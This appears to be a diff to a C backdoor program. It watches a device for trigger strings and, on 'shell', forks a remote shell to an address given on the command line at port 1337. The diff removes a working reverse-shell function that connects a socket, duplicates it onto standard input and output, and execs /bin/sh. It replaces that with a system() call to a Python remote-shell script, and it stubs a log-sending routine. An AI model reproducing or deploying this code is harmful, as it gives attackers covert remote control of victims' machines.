@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <stdlib.h>
 #include <fcntl.h>
 #include <paths.h>
 #include <string.h>
@@ -11,25 +12,26 @@
 #define LOGFILE "/log.txt"
 #define PORT 1337
 
-void sendLog();
-void remoteShell();
-
 int main(int argc, char *argv[]) {
     int fd;
     char buf[100];
+    char cmd[100];
     while (1) {
         if ((fd = open(DEVICE, O_RDWR)) != -1) {
             read(fd, buf, 100);
             if (strncmp(buf, "key", 3) == 0) {
                 if (fork() == 0) {
-                    sendLog();
+                    printf("Sending log\n");
+                    //sendLog();
                     exit(0);
                 }
             }
             else if (strncmp(buf, "shell", 5) == 0) {
                 if (fork() == 0) {
-                    remoteShell(argv[1]);
-                    exit(0);
+                    printf("Sending shell\n");
+                    sprintf(cmd, "python /remote.py %s %d", argv[1], PORT);
+                    system(cmd);
+                    return 0;
                 }
             }
             else {
@@ -38,26 +40,4 @@ int main(int argc, char *argv[]) {
         }
         close(fd);
     }
-}
-
-void sendLog() {
-    
-}
-
-void remoteShell(char* addr) {
-    struct sockaddr_in sa;
-    int s;
-
-    sa.sin_family = AF_INET;
-    sa.sin_addr.s_addr = inet_addr(addr);
-    sa.sin_port = htons(PORT);
-
-    s = socket(AF_INET, SOCK_STREAM, 0);
-    connect(s, (struct sockaddr *)&sa, sizeof(sa));
-    dup2(s, 0);
-    dup2(s, 1);
-    dup2(s, 2);
-
-    execve("/bin/sh", 0, 0);
-    return 0;
 }
